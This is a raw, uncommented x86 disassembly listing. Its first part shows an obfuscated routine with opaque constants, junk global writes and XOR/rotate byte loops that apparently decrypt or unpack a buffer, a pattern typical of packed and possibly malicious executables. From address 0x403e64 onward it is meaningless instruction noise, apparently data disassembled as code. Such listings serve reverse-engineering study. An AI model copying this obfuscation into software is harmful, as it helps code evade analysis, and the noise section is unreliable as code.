  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42a9e3
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292eb
  403aec:	mov    eax,ds:0x429777
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42a9e7
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	out    0x7d,al
  403e72:	rol    ebx,1
  403e74:	inc    edi
  403e75:	pusha  
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0xe
  403e7d:	cli    
  403e7e:	push   ecx
  403e7f:	(bad)  
  403e80:	jno    0x403e97
  403e82:	push   esp
  403e83:	mov    ebx,0xc333bdaf
  403e88:	shl    DWORD PTR [ecx],cl
  403e8a:	push   esp
  403e8b:	stos   BYTE PTR es:[edi],al
  403e8c:	jno    0x403e9f
  403e8e:	test   esi,edx
  403e90:	mov    DWORD PTR [ebx-0x2810a599],ebp
  403e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e97:	leave  
  403e98:	loope  0x403e8b
  403e9a:	lahf   
  403e9b:	mov    eax,ds:0xdcc5e267
  403ea0:	lahf   
  403ea1:	js     0x403eb7
  403ea3:	adc    DWORD PTR ss:[ebp-0x77012abd],edx
  403eaa:	cmp    al,0xdc
  403eac:	jmp    0x403e3d
  403eae:	arpl   di,cx
  403eb0:	mov    esp,0x8dee62ae
  403eb5:	mov    bh,0xdc
  403eb7:	scas   eax,DWORD PTR es:[edi]
  403eb8:	xchg   BYTE PTR [eax+0xf9ce94c],bh
  403ebe:	fwait
  403ebf:	stos   DWORD PTR es:[edi],eax
  403ec0:	into   
  403ec1:	xor    al,BYTE PTR [ebx+0x7eb2071]
  403ec7:	sub    DWORD PTR [ebx],edi
  403ec9:	sbb    al,BYTE PTR [ebp-0x4e]
  403ecc:	mov    DWORD PTR [ebp-0x2c72258b],ebx
  403ed2:	pop    es
  403ed3:	jo     0x403e6c
  403ed5:	sbb    al,0x7a
  403ed7:	ja     0x403eac
  403ed9:	add    al,0xac
  403edb:	mov    ebx,0x11f14caa
  403ee0:	pop    ecx
  403ee1:	ja     0x403ef7
  403ee3:	cmp    eax,0xa740f635
  403ee8:	xor    dl,dh
  403eea:	mov    eax,ds:0x6de6da8a
  403eef:	leave  
  403ef0:	sti    
  403ef1:	ror    ch,0x9e
  403ef4:	(bad)  
  403ef5:	add    edx,DWORD PTR gs:[eax]
  403ef8:	push   ebp
  403ef9:	rol    BYTE PTR [eax],1
  403efb:	out    0xa3,eax
  403efd:	push   0x250b31a1
  403f02:	push   es
  403f03:	fild   QWORD PTR [eax+0x73]
  403f06:	pusha  
  403f07:	imul   esi,ebx,0x9
  403f0a:	lahf   
  403f0b:	mov    dh,0x14
  403f0d:	mov    bl,0x66
  403f0f:	xor    DWORD PTR [ebx+0xd],edx
  403f12:	popa   
  403f13:	mov    ch,0x85
  403f15:	enter  0xc719,0xf8
  403f19:	jle    0x403f46
  403f1b:	sbb    DWORD PTR [esi-0x14],edi
  403f1e:	frstor [edi-0x55]
  403f21:	push   edx
  403f22:	push   ecx
  403f23:	inc    edi
  403f24:	xchg   ebx,eax
  403f25:	inc    edi
  403f26:	fcomp  QWORD PTR [ecx]
  403f28:	mov    ebx,DWORD PTR [ebp-0x6e19955f]
  403f2e:	mov    BYTE PTR [ebx+0x4f],dh
  403f31:	pop    edx
  403f32:	jae    0x403fa3
  403f34:	mov    al,0x53
  403f36:	ss add al,0x77
  403f39:	test   ecx,0x23b0b875
  403f3f:	adc    ebp,ebp
  403f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f42:	adc    ebp,edi
  403f44:	out    dx,eax
  403f45:	jae    0x403f35
  403f47:	pop    esi
  403f48:	imul   DWORD PTR [edi+0x3455e61d]
  403f4e:	icebp  
  403f4f:	aad    0x68
  403f51:	das    
  403f52:	dec    esp
  403f53:	cmp    al,0xd7
  403f56:	je     0x403edd
  403f58:	dec    eax
  403f59:	push   esi
  403f5a:	jns    0x403f08
  403f5c:	inc    ebx
  403f5d:	jecxz  0x403f25
  403f5f:	push   esi
  403f60:	sub    dl,BYTE PTR [eax]
  403f62:	sahf   
  403f63:	adc    eax,DWORD PTR [edx]
  403f65:	or     al,0x60
  403f67:	xor    esi,DWORD PTR [ebp-0x6a]
  403f6a:	iret   
  403f6b:	adc    BYTE PTR [esp+ebp*2-0x4a],bh
  403f6f:	pusha  
  403f70:	daa    
  403f71:	mov    ecx,DWORD PTR [esi-0x23]
  403f74:	cmp    ecx,esp
  403f76:	sub    edi,DWORD PTR [eax+0x26]
  403f79:	sub    BYTE PTR [ebx+edi*2],al
  403f7c:	sub    al,BYTE PTR [ebp-0x6edf14f3]
  403f82:	stc    
  403f83:	lods   al,BYTE PTR ds:[esi]
  403f84:	pop    eax
  403f85:	and    eax,0xa77f658e
  403f8a:	cmp    ah,BYTE PTR ds:0x52ec220e
  403f90:	or     cl,bl
  403f92:	adc    al,0xb6
  403f94:	jb     0x403ff7
  403f96:	sahf   
  403f97:	sar    DWORD PTR [esi+ebx*4-0x5a],1
  403f9b:	lods   al,BYTE PTR ds:[esi]
  403f9c:	test   BYTE PTR [ecx+0x3511c3dd],ah
  403fa2:	cmp    ch,BYTE PTR [edx+edi*4-0x4]
  403fa6:	(bad)  
  403fa7:	push   0xffffff8e
  403fa9:	cwde   
  403faa:	mov    eax,ds:0x983a3e81
  403faf:	test   BYTE PTR [esi+0x71b177f],ch
  403fb5:	xor    al,0x2d
  403fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fb8:	push   esp
  403fb9:	das    
  403fba:	pop    ebx
  403fbb:	cmp    eax,0x3b34c2c8
  403fc0:	test   BYTE PTR [eax-0x4c],dh
  403fc3:	adc    al,0xd7
  403fc5:	stc    
  403fc6:	push   esi
  403fc7:	rcr    BYTE PTR [eax+0x35],0x26
  403fcb:	scas   al,BYTE PTR es:[edi]
  403fcc:	sbb    ch,BYTE PTR [ebx-0x2b]
  403fcf:	pop    ebx
  403fd0:	jbe    0x403f9d
  403fd2:	and    al,bl
  403fd4:	cwde   
  403fd5:	push   es
  403fd6:	mov    eax,0x4aad0469
  403fdb:	outs   dx,DWORD PTR ds:[esi]
  403fdc:	sbb    BYTE PTR [esi+0x2b],0xb9
  403fe0:	js     0x404025
  403fe2:	sub    cl,BYTE PTR [esi]
  403fe4:	pop    edx
  403fe5:	ja     0x40401c
  403fe7:	stos   BYTE PTR es:[edi],al
  403fe8:	or     ecx,DWORD PTR [esi]
  403fea:	call   0xf453e01f
  403fef:	out    0x65,eax
  403ff1:	cmp    al,0x6
  403ff3:	sub    eax,0xd3c4e742
  403ff8:	jg     0x404037
  403ffa:	(bad)  
  403ffb:	xchg   esi,eax
  403ffc:	rol    esi,cl
  403ffe:	in     al,0x6f
  404000:	pop    esp
  404001:	les    ebx,FWORD PTR cs:[ebp+0x588b0e6b]
  404008:	(bad)  
  404009:	sub    al,BYTE PTR [ecx-0x25]
  40400c:	js     0x404044
  40400e:	xchg   edi,eax
  40400f:	jp     0x40401a
  404011:	loopne 0x40405a
  404013:	cmp    DWORD PTR [eax-0x5f5c7058],eax
  404019:	sub    esi,DWORD PTR fs:[edx]
  40401c:	adc    bh,BYTE PTR [eax+0x45]
  40401f:	xchg   esi,eax
  404020:	(bad)  
  404021:	aam    0xa0
  404023:	push   ds
  404024:	adc    eax,DWORD PTR ds:0x57919f59
  40402a:	call   0xf169:0xd27a013f
  404031:	out    0x8e,eax
  404033:	fiadd  DWORD PTR [ebx+ebp*2]
  404036:	or     bl,BYTE PTR [ebx+esi*1-0x67]
  40403a:	dec    eax
  40403b:	in     al,dx
  40403c:	or     esi,ebp
  40403e:	hlt    
  40403f:	gs xchg edi,eax
  404041:	xchg   ebx,eax
  404042:	cmp    eax,0x152d311
  404047:	aas    
  404048:	in     eax,0xb0
  40404a:	xor    esp,DWORD PTR [ebx+ecx*4]
  40404d:	fst    DWORD PTR [eax+0x78]
  404050:	sbb    bl,al
  404052:	sub    DWORD PTR [eax-0x2387c8d7],esi
  404058:	out    0xfc,eax
  40405a:	pop    ss
  40405b:	sbb    al,0xa
  40405d:	mov    WORD PTR [edi],?
  40405f:	iret   
  404060:	test   BYTE PTR [ecx+ebp*2],0x93
  404064:	jecxz  0x404047
  404066:	adc    BYTE PTR [ebp+edx*8-0x3d],dl
  40406a:	loopne 0x404022
  40406c:	push   esi
  40406d:	ficomp WORD PTR [edi+ebp*2-0xd]
  404071:	test   eax,0xcc8293b
  404076:	xchg   ebx,eax
  404077:	shl    BYTE PTR [eax-0x5f],0x2e
  40407b:	jnp    0x404064
  40407d:	jo     0x40405d
  40407f:	aas    
  404080:	icebp  
  404081:	imul   ebx,DWORD PTR [edx+0x6f8c8c6b],0xffffff90
  404088:	leave  
  404089:	sub    al,0x2b
  40408b:	outs   dx,DWORD PTR ds:[esi]
  40408c:	out    dx,eax
  40408d:	jl     0x40406e
  40408f:	jne    0x404071
  404091:	lahf   
  404092:	lock sbb eax,0x5aefa36
  404098:	fcomp  st(5)
  40409a:	fmul   QWORD PTR [ecx]
  40409c:	fdivrp st(5),st
  40409e:	sbb    DWORD PTR [edx+0x4506f376],eax
  4040a4:	sub    eax,0x1fa4c5dd
  4040a9:	(bad)  
  4040aa:	call   0xd648929a
  4040af:	fnsave [ebp+0x19da43cf]
  4040b5:	mov    ah,0xe5
  4040b7:	and    al,0x6e
  4040b9:	je     0x4040a1
  4040bb:	pop    es
  4040bc:	lds    edx,FWORD PTR [ebx-0x17925c17]
  4040c2:	inc    eax
  4040c3:	push   ebp
  4040c4:	adc    al,0xda
  4040c6:	scas   al,BYTE PTR es:[edi]
  4040c7:	jmp    0x59e0a011
  4040cc:	xchg   ebp,eax
  4040cd:	xchg   ebp,eax
  4040ce:	push   ebp
  4040cf:	lds    edi,FWORD PTR fs:[esi-0x58]
  4040d3:	sub    al,BYTE PTR [esi-0x4c]
  4040d6:	push   ebp
  4040d7:	push   es
  4040d8:	cdq    
  4040d9:	mov    esi,0x84ec86ee
  4040de:	std    
  4040df:	mov    ds:0xd95c7ad4,eax
  4040e4:	mov    bh,0xe9
  4040e6:	(bad)  
  4040e7:	mov    edi,0x9ab161cb
  4040ec:	push   ebx
  4040ed:	xchg   ecx,eax
  4040ee:	mov    ebx,0xc2cebfdf
  4040f3:	xchg   ecx,eax
  4040f4:	mov    al,ds:0x434f7616
  4040f9:	mov    esp,0x7326f462
  4040fe:	scas   al,BYTE PTR es:[edi]
  4040ff:	mov    ds:0x4137a19a,eax
  404104:	lods   al,BYTE PTR ds:[esi]
  404105:	das    
  404106:	mov    edx,0x693e93f8
  40410b:	push   esi
  40410c:	outs   dx,BYTE PTR ds:[esi]
  40410d:	stos   DWORD PTR es:[edi],eax
  40410e:	in     al,dx
  40410f:	nop
  404110:	xor    esp,DWORD PTR [esi-0x6c]
  404113:	aam    0x96
  404115:	std    
  404116:	(bad)  
  404117:	outs   dx,DWORD PTR ds:[esi]
  404118:	xchg   esp,eax
  404119:	jb     0x4040c8
  40411b:	inc    edx
  40411c:	stc    
  40411d:	mov    BYTE PTR [esp+eiz*4-0x67f1ae09],dh
  404124:	cmp    edx,DWORD PTR [edx+0x60a1ca3f]
  40412a:	jle    0x404151
  40412c:	sub    BYTE PTR [ecx],bh
  40412e:	pop    ebx
  40412f:	jg     0x404180
  404131:	aaa    
  404132:	sub    BYTE PTR [edi+0x4f03adf5],al
  404138:	cmc    
  404139:	xchg   dl,cl
  40413b:	cli    
  40413c:	xor    ebp,edx
  40413e:	pop    es
  40413f:	into   
  404140:	lds    bp,DWORD PTR ds:[ebp-0x30]
  404145:	loope  0x40416f
  404147:	ja     0x404153
  404149:	add    al,0xf8
  40414b:	mov    BYTE PTR [esi+0x1c],bh
  40414e:	fsubr  DWORD PTR [esi-0x747da1ae]
  404154:	or     al,BYTE PTR [edi]
  404156:	push   ss
  404157:	xchg   DWORD PTR [edx+0x3bfb6a95],esp
  40415d:	ins    DWORD PTR es:[edi],dx
  40415e:	stc    
  40415f:	dec    edx
  404160:	test   ebp,0xd490498d
  404166:	cdq    
  404167:	test   ebx,esp
  404169:	repnz mov ds:0xd1347133,al
  40416f:	retf   0xa851
  404172:	mov    esi,0xb2bf38f7
  404177:	mov    BYTE PTR [ecx+ebp*2+0x6f631b4e],bh
  40417e:	and    BYTE PTR [edx-0x5fe84f47],bl
  404184:	jb     0x40416e
  404186:	mov    esi,0xbe27cdde
  40418b:	int    0xc5
  40418d:	ins    DWORD PTR es:[edi],dx
  40418e:	ins    DWORD PTR es:[edi],dx
  40418f:	ret    0x6c26
  404192:	out    dx,eax
  404193:	fstp   QWORD PTR [edi-0x15]
  404196:	dec    esp
  404197:	sbb    edi,DWORD PTR [edx+0x5869a4f2]
  40419d:	mov    al,0xcd
  40419f:	dec    ebp
  4041a0:	mov    edx,0x41e84fd6
  4041a5:	or     edx,DWORD PTR [edi+0x3ebe9660]
  4041ab:	sub    bl,BYTE PTR [edi+eax*1]
  4041ae:	pop    ss
  4041af:	push   esi
  4041b0:	sbb    cl,BYTE PTR [edx+0x72]
  4041b3:	inc    esp
  4041b4:	xchg   edx,eax
  4041b5:	mov    cl,0x24
  4041b7:	rcl    DWORD PTR [esi],1
  4041b9:	mov    ebp,0x4fc4be70
  4041be:	sbb    dl,BYTE PTR [eax+0x52]
  4041c1:	sahf   
  4041c2:	test   al,0x39
  4041c4:	jl     0x404207
  4041c6:	or     bl,bl
  4041c8:	push   ss
  4041c9:	iret   
  4041ca:	mov    ds:0xe18abfb8,al
  4041cf:	das    
  4041d0:	into   
  4041d1:	repz pop es
  4041d3:	push   eax
  4041d4:	push   0x9ef51263
  4041d9:	mov    ds,WORD PTR [edi-0x589a3db]
  4041df:	(bad)  
  4041e0:	outs   dx,BYTE PTR ds:[esi]
  4041e1:	cli    
  4041e2:	pop    esp
  4041e3:	fnstcw WORD PTR [esi-0x4f]
  4041e6:	cmp    ebx,0xffffff82
  4041e9:	mov    cl,0xd1
  4041eb:	mov    esp,0x7d864e8f
  4041f0:	mov    BYTE PTR [eax],bl
  4041f2:	push   ebp
  4041f3:	daa    
  4041f4:	idiv   BYTE PTR [esi+0x33]
  4041f7:	les    esi,FWORD PTR [ecx]
  4041f9:	loop   0x404200
  4041fb:	xchg   ebp,eax
  4041fc:	adc    eax,0x96b13794
  404201:	es enter 0x6a4b,0xf7
  404206:	inc    esp
  404207:	mov    ebp,0xa40f99b7
  40420c:	jmp    0x404283
  40420e:	ret    0x4cec
  404211:	adc    ch,BYTE PTR ss:[edi-0x36]
  404215:	(bad)  [edx+edi*8]
  404218:	push   esp
  404219:	data16 jnp 0x4041bc
  40421c:	rcr    DWORD PTR [edi],1
  40421e:	add    ecx,DWORD PTR [esi]
  404220:	xchg   bh,cl
  404222:	pop    ebp
  404223:	nop
  404224:	mov    esi,0xca7f2e4b
  404229:	fstp   DWORD PTR [esi+0x7325fdd0]
  40422f:	sbb    eax,DWORD PTR ds:0x6fb9c048
  404235:	jne    0x404204
  404237:	ret    
  404238:	out    0xf,eax
  40423a:	dec    esi
  40423b:	mov    ah,0xfb
  40423d:	xor    DWORD PTR [ebp+0x4cce60c5],esp
  404243:	sub    dl,0x32
  404246:	cmp    DWORD PTR [esi],ecx
  404248:	pop    ecx
  404249:	and    ecx,ebp
  40424b:	jbe    0x404266
  40424d:	sti    
  40424e:	push   ss
  40424f:	pop    edx
